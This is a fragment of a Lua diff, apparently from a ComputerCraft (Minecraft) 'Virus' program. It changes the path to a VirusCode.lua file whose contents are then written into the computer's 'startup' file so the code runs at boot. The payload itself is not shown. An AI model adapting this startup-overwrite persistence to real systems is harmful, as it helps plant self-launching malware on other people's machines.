@@ -19,7 +19,7 @@ else
 windows.clearScreen(colors.orange)
 term.setCursorPos(1, 1)
 
-local VirusCode_f = fs.open("Resources/VirusCode.lua", "r")
+local VirusCode_f = fs.open("Programs/Virus.program/Resources/VirusCode.lua", "r")
 local VirusCode = VirusCode_f.readAll()
 
 govno = fs.open("startup", "w")
